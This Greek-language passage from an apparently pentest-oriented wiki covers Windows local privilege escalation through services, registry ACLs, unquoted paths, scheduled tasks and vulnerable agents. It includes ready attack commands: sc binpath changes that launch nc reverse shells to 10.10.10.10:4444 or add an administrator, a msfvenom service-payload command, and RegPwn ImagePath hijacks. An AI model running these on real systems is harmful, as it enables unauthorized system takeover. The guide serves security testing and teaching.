Για έναν monitoring agent NSClient++, ένα αναγνώσιμο `nsclient.ini` αποτελεί **ένδειξη προς διερεύνηση της διαμόρφωσης**: ενδέχεται να περιέχει διαπιστευτήρια web, ενώ το `boot.ini` μπορεί να ανακατευθύνει τη διαμόρφωση σε άλλη τοποθεσία. Ελέγξτε τον πραγματικό λογαριασμό υπηρεσίας, τον listener WEB και την πολιτική πρόσβασης, καθώς και αν ο πιστοποιημένος ρόλος μπορεί να αλλάξει ρυθμίσεις ή scripts. Η προνομιούχα εκτέλεση απαιτεί επιπλέον `CheckExternalScripts` (ή άλλη ενεργοποιημένη διαδρομή εκτέλεσης), πραγματικό δικαίωμα καταχώρισης ή τροποποίησης εντολής και trigger που την εκτελεί με την ταυτότητα της υπηρεσίας. Ένας listener που δέχεται συνδέσεις μόνο από loopback μπορεί και πάλι να είναι προσβάσιμος από τοπικό χρήστη, αλλά η διαδρομή αρχείου, ο κωδικός πρόσβασης ή ο listener από μόνα τους δεν αποδεικνύουν την ύπαρξη αυτών των δικαιωμάτων. Εξετάστε τα μεταδεδομένα και τα δικαιώματα χωρίς να εμφανίσετε μυστικά ή να καλέσετε το web API κατά την παθητική απαρίθμηση. Δείτε τη [διάταξη αρχείων NSClient++](https://nsclient.org/docs/concepts/file-layout/), τις [οδηγίες ασφάλειας web και script](https://nsclient.org/docs/setup/securing/) και τη [διαμόρφωση external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Για υπηρεσία της οποίας το `ImagePath` είναι `nssm.exe`, εξετάστε τον πραγματικό λογαριασμό εκτέλεσης της υπηρεσίας και την τιμή `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [το NSSM αποθηκεύει εκεί την εφαρμογή-θυγατρική](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), ενώ το `AppDirectory` είναι ο διαμορφωμένος κατάλογος εργασίας της. Ελέγξτε το εκτελέσιμο αρχείο-θυγατρική και τα ACL των γονικών καταλόγων του, πριν θεωρήσετε ότι τα δικαιώματα του wrapper περιγράφουν πλήρως το όριο της υπηρεσίας. Ένα τοπικό endpoint WCF ή SOAP που εκθέτει αυτό το εκτελέσιμο αρχείο-θυγατρική αποτελεί ξεχωριστή ένδειξη προς διερεύνηση: επιβεβαιώστε ότι ο χρήστης με χαμηλότερα δικαιώματα μπορεί να συνδεθεί στον listener, ότι η συγκεκριμένη λειτουργία δέχεται την είσοδό του και ότι το εκτελέσιμο αρχείο-θυγατρική εκτελεί την μη ασφαλή λειτουργία με υψηλότερη ταυτότητα. Ο λογαριασμός υπηρεσίας, ένα URL endpoint ή μια εγγράψιμη διαδρομή από μόνα τους δεν αποδεικνύουν κλιμάκωση· μην καλείτε λειτουργίες της υπηρεσίας κατά την παθητική απαρίθμηση.

Για μια προσαρμοσμένη λειτουργία WCF, ακολουθήστε μια συμβολοσειρά που ελέγχει ο καλών καθώς περνά σε οποιοδήποτε PowerShell runspace. Η [`Pipeline.Commands.AddScript προσθέτει κείμενο script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) και η [`Pipeline.Invoke εκτελεί το pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ένα [`netTcpBinding με διαπιστευτήρια μεταφοράς Windows`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) πιστοποιεί τον client, αλλά η εξουσιοδότηση για κλήση της **συγκεκριμένης** λειτουργίας και η πραγματική ταυτότητα του runspace πρέπει να ελεγχθούν ξεχωριστά. Μια διαδρομή από είσοδο καλούντος με χαμηλότερα δικαιώματα προς το `AddScript` υπό υψηλότερη ταυτότητα υπηρεσίας αποτελεί όριο εκτέλεσης κώδικα· μια θύρα σε κατάσταση ακρόασης, ένας πιστοποιημένος client ή μια αχρησιμοποίητη μέθοδος σε άσχετη assembly από μόνα τους δεν αποτελούν απόδειξη. Εξετάστε στατικά την εγκατεστημένη υπηρεσία, το contract, την εξουσιοδότηση και τις ρυθμίσεις impersonation, χωρίς να καλέσετε το endpoint κατά την απαρίθμηση.

Τα Service Triggers επιτρέπουν στα Windows να εκκινούν μια υπηρεσία όταν προκύπτουν ορισμένες συνθήκες (δραστηριότητα named pipe/RPC endpoint, συμβάντα ETW, διαθεσιμότητα IP, σύνδεση συσκευής, ανανέωση GPO κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, μπορείτε συχνά να εκκινήσετε προνομιούχες υπηρεσίες ενεργοποιώντας τα triggers τους. Δείτε εδώ τεχνικές απαρίθμησης και ενεργοποίησης:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Υπηρεσία συλλογής διαγνωστικών του Visual Studio

Οι εγκαταστάσεις του Visual Studio με εργαλεία C/C++ ενδέχεται να περιλαμβάνουν το `VSStandardCollectorService150`, μια υπηρεσία διαγνωστικών ρυθμισμένη να εκτελείται ως `LocalSystem`. Το [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) χρησιμοποίησε ένα race με junction και object-manager-link για να ανακατευθύνει την επαναφορά του DACL μιας υπηρεσίας. Η αποδεδειγμένη κλιμάκωση απαιτούσε επίσης μια αξιοποιήσιμη διαδρομή επιδιόρθωσης MSI του Visual Studio Setup WMI Provider και τον στόχο `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Το στοιχείο διορθώθηκε τον Ιανουάριο του 2024.

Για παθητική διαλογή, εξετάστε τον λογαριασμό και τη διαδρομή του εκτελέσιμου αρχείου αυτής της υπηρεσίας, ελέγξτε αν υπάρχει η διαδρομή του Setup WMI compiler και επαληθεύστε την κατάσταση των patches του εγκατεστημένου στοιχείου. Μια καταχώριση υπηρεσίας, η έκδοση προϊόντος του Visual Studio ή ένα αρχείο compiler από μόνα τους δεν αποδεικνύουν ότι ο host είναι ευάλωτος. Η εξέταση δεν απαιτεί την εκκίνηση της υπηρεσίας ή την εκτέλεση επιδιόρθωσης.

Λάβετε μια λίστα υπηρεσιών:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία.

```bash
sc qc <service_name>
```

Συνιστάται να έχετε το binary **accesschk** από τη _Sysinternals_, για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν κάποια υπηρεσία:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν εμφανίζεται αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Δεν είναι δυνατή η εκκίνηση της υπηρεσίας, είτε επειδή είναι απενεργοποιημένη είτε επειδή δεν υπάρχουν ενεργοποιημένες συσκευές που να σχετίζονται με αυτή._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** σε αυτό το πρόβλημα είναι να εκτελέσετε:

```
sc.exe config usosvc start= auto
```

### **Τροποποίηση της διαδρομής του service binary**

Στο σενάριο όπου η ομάδα «Authenticated users» διαθέτει **SERVICE_ALL_ACCESS** σε ένα service, είναι δυνατή η τροποποίηση του εκτελέσιμου binary του service. Για να τροποποιήσετε και να εκτελέσετε το **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Επανεκκίνηση υπηρεσίας

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Τα προνόμια μπορούν να κλιμακωθούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του binary της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την αναδιαμόρφωση δικαιωμάτων, παρέχοντας τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση κυριότητας και την αναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Παρέχει επίσης τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Παρέχει επίσης τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα δικαιώματα σε binary υπηρεσιών

Αν μια υπηρεσία εκτελείται ως **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ή ως προνομιούχος λογαριασμός domain, αλλά **χρήστες με χαμηλά προνόμια μπορούν να τροποποιήσουν το EXE της υπηρεσίας ή τον γονικό φάκελό του**, η υπηρεσία μπορεί συχνά να παραβιαστεί **αντικαθιστώντας το binary και επανεκκινώντας την υπηρεσία**.

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να λάβετε όλα τα binary που εκτελούνται από μια υπηρεσία χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας το **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Μπορείτε επίσης να χρησιμοποιήσετε τα **sc** και **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Αναζητήστε επικίνδυνα ACL που έχουν εκχωρηθεί σε **`Everyone`**, **`BUILTIN\Users`** ή **`Authenticated Users`**, ειδικά δικαιώματα **`(F)`**, **`(M)`** ή **`(W)`** στο εκτελέσιμο αρχείο της υπηρεσίας ή στον κατάλογο που το περιέχει. Μια πρακτική ροή εκμετάλλευσης είναι η εξής:<sup>[[27]](#references)</sup>

1. Επιβεβαιώστε τον λογαριασμό υπηρεσίας και τη διαδρομή του εκτελέσιμου αρχείου με `sc qc <service_name>`.
2. Επιβεβαιώστε ότι το δυαδικό αρχείο είναι εγγράψιμο με `icacls <path>`.
3. Αντικαταστήστε το δυαδικό αρχείο της υπηρεσίας με ένα payload ή ένα έγκυρο κακόβουλο δυαδικό αρχείο υπηρεσίας.
4. Επανεκκινήστε την υπηρεσία με `sc stop <service_name> && sc start <service_name>` (ή περιμένετε επανεκκίνηση / ενεργοποίηση από trigger υπηρεσίας).

Χρήσιμοι αυτοματοποιημένοι έλεγχοι:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Αν η υπηρεσία δεν επιτρέπει σε έναν κανονικό χρήστη να την επανεκκινήσει, έλεγξε αν ξεκινά αυτόματα κατά την εκκίνηση, αν έχει ενέργεια αποτυχίας που την εκκινεί ξανά ή αν μπορεί να ενεργοποιηθεί έμμεσα από την εφαρμογή που τη χρησιμοποιεί.

### Δικαιώματα τροποποίησης μητρώου υπηρεσιών

Θα πρέπει να ελέγξεις αν μπορείς να τροποποιήσεις κάποιο μητρώο υπηρεσίας.\
Μπορείς να **ελέγξεις** τα **δικαιώματά** σου σε ένα **μητρώο** υπηρεσίας ως εξής:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Ελέγξτε αν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα εγγραφής στο μητρώο για ένα συγκεκριμένο κλειδί υπηρεσίας. Μια καταχώριση ACL από μόνη της δεν αποδεικνύει ότι η πρόσβαση είναι αποτελεσματική: σημασία έχουν οι καταχωρίσεις άρνησης, το τρέχον token και τα κληρονομημένα δικαιώματα. Τα δικαιώματα κλειδιού μητρώου είναι ξεχωριστά από τα δικαιώματα `SERVICE_CHANGE_CONFIG` και `SERVICE_START` του αντικειμένου υπηρεσίας. Η κλιμάκωση απαιτεί επίσης ένα αξιοποιήσιμο πεδίο διαμόρφωσης υπηρεσίας, έναν τρόπο ενεργοποίησης της υπηρεσίας και μια ταυτότητα υπηρεσίας με περισσότερα προνόμια. Δείτε τα [δικαιώματα κλειδιών μητρώου](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) της Microsoft και την [αναφορά δικαιωμάτων πρόσβασης υπηρεσιών](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Για να αλλάξετε τη διαδρομή του εκτελούμενου binary:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race συνδέσμου μητρώου για αυθαίρετη εγγραφή τιμής HKLM (ATConfig)

Ορισμένες δυνατότητες προσβασιμότητας των Windows δημιουργούν κλειδιά **ATConfig** ανά χρήστη, τα οποία αργότερα αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Ένα **race συμβολικού συνδέσμου** στο μητρώο μπορεί να ανακατευθύνει αυτήν την προνομιούχα εγγραφή σε **οποιαδήποτε διαδρομή HKLM**, παρέχοντας δυνατότητα **αυθαίρετης εγγραφής τιμής** στο HKLM.<sup>[[18]](#references)</sup>

Βασικές τοποθεσίες (παράδειγμα: Πληκτρολόγιο οθόνης `osk`):

- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` παραθέτει τις εγκατεστημένες δυνατότητες προσβασιμότητας.
- Το `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει ρυθμίσεις που ελέγχονται από τον χρήστη.
- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά τη σύνδεση ή κατά τις μεταβάσεις στην ασφαλή επιφάνεια εργασίας και είναι εγγράψιμο από τον χρήστη.

Ροή εκμετάλλευσης (CVE-2026-24291 / ATConfig):

1. Συμπληρώστε την τιμή **HKCU ATConfig** που θέλετε να εγγράψει η SYSTEM.
2. Ενεργοποιήστε την αντιγραφή στην ασφαλή επιφάνεια εργασίας (π.χ., **LockWorkstation**), η οποία ξεκινά τη ροή του AT broker.
3. **Κερδίστε το race** τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`. Όταν ενεργοποιηθεί το oplock, αντικαταστήστε το κλειδί **HKLM Session ATConfig** με έναν **σύνδεσμο μητρώου** προς έναν προστατευμένο στόχο HKLM.
4. Η SYSTEM εγγράφει την επιλεγμένη από τον εισβολέα τιμή στην ανακατευθυνόμενη διαδρομή HKLM.

Αφού αποκτήσετε δυνατότητα αυθαίρετης εγγραφής τιμής HKLM, προχωρήστε σε LPE αντικαθιστώντας τιμές ρύθμισης υπηρεσιών:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/γραμμή εντολών)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επιλέξτε μια υπηρεσία που μπορεί να εκκινηθεί από έναν κανονικό χρήστη (π.χ., **`msiserver`**) και ενεργοποιήστε την μετά την εγγραφή. **Σημείωση:** η δημόσια υλοποίηση του exploit **κλειδώνει τον σταθμό εργασίας** στο πλαίσιο του race.

Ενδεικτικά εργαλεία (RegPwn BOF / αυτόνομο):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Δικαιώματα AppendData/AddSubdirectory στο registry των υπηρεσιών

Αν έχετε αυτό το δικαίωμα σε ένα registry, σημαίνει ότι **μπορείτε να δημιουργήσετε υπο-registry μέσα σε αυτό**. Στην περίπτωση των υπηρεσιών των Windows, αυτό **αρκεί για την εκτέλεση αυθαίρετου κώδικα:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Διαδρομές υπηρεσιών χωρίς εισαγωγικά

Αν η διαδρομή προς ένα εκτελέσιμο αρχείο δεν περικλείεται σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα της που τελειώνει πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Καταγράψτε όλες τις unquoted service paths, εξαιρώντας όσες ανήκουν στις ενσωματωμένες υπηρεσίες των Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα δυαδικό αρχείο υπηρεσίας με το metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Ενέργειες αποκατάστασης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν ενέργειες που θα εκτελούνται αν αποτύχει μια υπηρεσία. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η κλιμάκωση προνομίων. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Στόχοι script προγραμματισμένων εργασιών

Για μια ενεργοποιημένη εργασία που εκτελεί `cmd.exe /c` με αρχείο `.bat` ή `.cmd`, ελέγξτε το script που αναφέρεται στα **ορίσματα ενέργειας**, καθώς και το `cmd.exe`. Το ίδιο ισχύει για ρητό όρισμα αρχείου ενός interpreter, όπως το PowerShell `-File`. Αν ένα προγραμματισμένο batch file περιέχει κυριολεκτική κλήση PowerShell `-File`, ελέγξτε και τα ACL του script στο οποίο παραπέμπει· οι μεταβλητές, οι συνθήκες και η αλυσιδωτή εκτέλεση εντολών απαιτούν χειροκίνητη ιχνηλάτηση. Ένα script ή γονικός φάκελος στον οποίο μπορεί να γράψει ο καλών αποτελεί ένδειξη πιθανής εκτέλεσης μεταξύ λογαριασμών μόνο όταν το principal της ρυθμισμένης εργασίας διαφέρει από τον καλούντα και η εργασία φτάνει πράγματι σε αυτήν την ενέργεια. Ένα ACL που επιτρέπει μόνο προσθήκη μπορεί να έχει σημασία για scripts, αλλά ένα προηγούμενο `exit` ή άλλη ροή ελέγχου μπορεί να καταστήσει τις γραμμές που προστέθηκαν μη προσβάσιμες. Επιβεβαιώστε τα πραγματικά δικαιώματα ACL, το [πλαίσιο εκτέλεσης εργασίας](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), τον φάκελο εργασίας, το trigger και την πολιτική ελέγχου εφαρμογών πριν ισχυριστείτε ότι είναι δυνατή η κλιμάκωση. Η απογραφή δεν πρέπει να τροποποιεί το script ούτε να εκκινεί την εργασία.

## Named streams σε προσβάσιμα αρχεία

Στο NTFS, ένα αναγνώσιμο αρχείο μπορεί να έχει ένα named stream `:$DATA`, του οποίου τα περιεχόμενα δεν εμφανίζονται σε μια συνηθισμένη λίστα καταλόγου. Για ένα μικρό, σχετικό σύνολο προσβάσιμων αντιγράφων ασφαλείας ή αρχείων ρυθμίσεων, εξετάστε τα **ονόματα και τα μεγέθη** των streams πριν ανοίξετε οποιοδήποτε περιεχόμενο· τα Windows παρέχουν πρόσβαση σε αυτά μέσω των [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) και του PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ένα όνομα stream που υποδηλώνει μυστικό αποτελεί μόνο ένδειξη. Ελέγξτε την πραγματική πρόσβαση ανάγνωσης στο αρχείο, την υποστήριξη streams από το σύστημα αρχείων, αν το stream περιέχει αξιοποιήσιμα διαπιστευτήρια και με ποιον λογαριασμό πραγματοποιούν πράγματι έλεγχο ταυτότητας. Αποφύγετε τις αναδρομικές σαρώσεις streams και την εκτύπωση των περιεχομένων τους κατά τη συνήθη απαρίθμηση.

## Είσοδοι helper του Windows Driver Kit για προγραμματισμένες εργασίες

Το προαιρετικό Windows Driver Kit περιλαμβάνει το `StandaloneRunner.exe`, το οποίο μπορεί να διαβάσει τα αρχεία `command.txt`, `reboot.rsf` και `working\rsf.rsf` ενός project από τον φάκελο εκτέλεσής του. Μια προγραμματισμένη εργασία ή υπηρεσία που εκκινεί αυτό το helper με προνομιούχο λογαριασμό μπορεί να μετατρέψει την πρόσβαση εγγραφής χαμηλών προνομίων σε αυτές τις εισόδους σε εκτέλεση εντολών στο πλαίσιο αυτού του λογαριασμού, ακόμη κι όταν το ίδιο το εκτελέσιμο αρχείο του helper είναι προστατευμένο. Επιβεβαιώστε ότι υπάρχει προνομιούχος διεργασία που καταναλώνει τα αρχεία και ότι **και τα δύο** συνοδευτικά αρχεία μπορούν να δημιουργηθούν ή να τροποποιηθούν· η εύρεση του helper από μόνη της δεν αρκεί.

Για μια προγραμματισμένη εργασία, εξετάστε την [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) της ενέργειάς της και τα ACL των δύο διαδρομών των συνοδευτικών αρχείων. Αν η εργασία δεν ορίζει φάκελο εργασίας, ο φάκελος του εκτελέσιμου αρχείου αποτελεί μόνο ένδειξη προς επαλήθευση, όχι απόδειξη για το πού διαβάζει η εργασία τις εισόδους της. Πρέπει επίσης να πληρούται η προϋπόθεση του αρχείου εργασίας του project. Ελέγξτε το πραγματικό principal της εργασίας αντί να υποθέσετε ότι εκτελείται ως SYSTEM.

## Εφαρμογές

### Εγκατεστημένες εφαρμογές

Ελέγξτε τα **δικαιώματα των binary** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να κλιμακώσετε προνόμια) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Διαδρομή επιδιόρθωσης του Checkmk Windows agent

Το [CVE-2024-0670](https://checkmk.com/werk/16361) επηρεάζει παλαιότερους Checkmk Windows agents που έγραφαν αρχεία εντολών στο `C:\Windows\Temp` και στη συνέχεια εκτελούσαν ένα ήδη υπάρχον αρχείο με προστασία εγγραφής, όταν αποτύγχανε η αντικατάστασή του. Ο προμηθευτής διόρθωσε το πρόβλημα στις εκδόσεις 2.1.0p40, 2.2.0p23, 2.3.0b1 και 2.4.0b1. Ελέγξτε το πλήρες εγκατεστημένο επίπεδο patch και αν μπορεί να εκτελεστεί η επηρεαζόμενη λειτουργία του agent· μια ένδειξη μόνο του branch, όπως `2.1`, δεν αρκεί για να διαπιστωθεί αν υπάρχει έκθεση. Η απαρίθμηση μπορεί να ελέγξει την έκδοση, την κατάσταση της υπηρεσίας και τα δικαιώματα στο Temp χωρίς να δημιουργεί αρχεία ή να ενεργοποιεί εντολές του agent.

#### Έλεγχος της υπηρεσίας SAML του ADSelfService Plus

Το [CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) επηρέαζε το build 6210 και παλαιότερα του ADSelfService Plus· ο προμηθευτής το διόρθωσε στο build 6211. Είναι σχετικό μόνο αν το SAML SSO **είναι ή ήταν** ενεργοποιημένο. Επομένως, μια καταχώριση εγκατεστημένου προϊόντος ή μια διαδρομή υπηρεσίας είναι ένδειξη προς διερεύνηση, όχι απόδειξη ευπάθειας: επιβεβαιώστε το ακριβές build, το ιστορικό ρυθμίσεων SAML, την προσβασιμότητα της υπηρεσίας μέσω δικτύου και τον λογαριασμό με τον οποίο εκτελείται. Η εκτέλεση κώδικα μέσω της υπηρεσίας κληρονομεί τα δικαιώματα αυτού του λογαριασμού· η εκτέλεση ως SYSTEM απαιτεί instance που εκτελείται ως SYSTEM. Ένα αναγνώσιμο `OfflineBackup_*.ezip` στον κατάλογο Backup του προϊόντος είναι ξεχωριστή ένδειξη κρυπτογραφημένου backup, όχι απόδειξη αξιοποιήσιμου διαπιστευτηρίου ή της συγκεκριμένης αδυναμίας SAML. Καταγράψτε τη διαδρομή και τα δικαιώματα πρόσβασης χωρίς να το αποσυσκευάσετε κατά τη συνήθη απαρίθμηση.

#### Όρια του Jenkins controller και των domain accounts

Σε Windows Jenkins controller, διακρίνετε το δικαίωμα δημιουργίας ή ρύθμισης ενός job από το δικαίωμα εκκίνησής του: [η Jenkins τα τεκμηριώνει ως ξεχωριστά δικαιώματα `Job/Create`, `Job/Configure` και `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ένα ρυθμισμένο schedule ή remote trigger μπορεί να προσφέρει έναν επιπλέον τρόπο εκτέλεσης build, αλλά επιβεβαιώστε ότι είναι ενεργοποιημένο και ότι το build εκτελείται πράγματι. Η εκτέλεση χρησιμοποιεί την ταυτότητα του controller ή του επιλεγμένου agent, ενώ ένα αποθηκευμένο credential μπορεί να χρησιμοποιηθεί μόνο αν το job έχει πρόσβαση στο scope του. Ελέγξτε χωριστά την πρόσβαση στα metadata του `JENKINS_HOME`: η Jenkins αποθηκεύει υλικό διαπιστευτηρίων και κλειδιά κρυπτογράφησης στα `credentials.xml`, `secrets/hudson.util.Secret` και `secrets/master.key` ([αποθήκευση μυστικών της Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Η παρουσία τους από μόνη της δεν αποκαλύπτει κωδικό πρόσβασης· επιβεβαιώστε **δικαίωμα ανάγνωσης στα απαιτούμενα αρχεία** και ξεχωριστή διαδρομή επαναχρησιμοποίησης λογαριασμού χωρίς να εμφανίζετε μυστικά σε κοινόχρηστη έξοδο. Αν αυτός ο λογαριασμός έχει δικαίωμα εγγραφής στο `scriptPath` ενός αντικειμένου χρήστη AD, επιβεβαιώστε ότι η διαδρομή script είναι εγγράψιμη και ότι υπάρχει πραγματική σύνδεση ή προγραμματισμένος καταναλωτής που εκτελείται ως ο χρήστης-στόχος, πριν το θεωρήσετε εκτέλεση μεταξύ χρηστών. Για περαιτέρω έλεγχο ομάδων απαιτείται ξεχωριστή επαλήθευση των πραγματικών δικαιωμάτων AD.

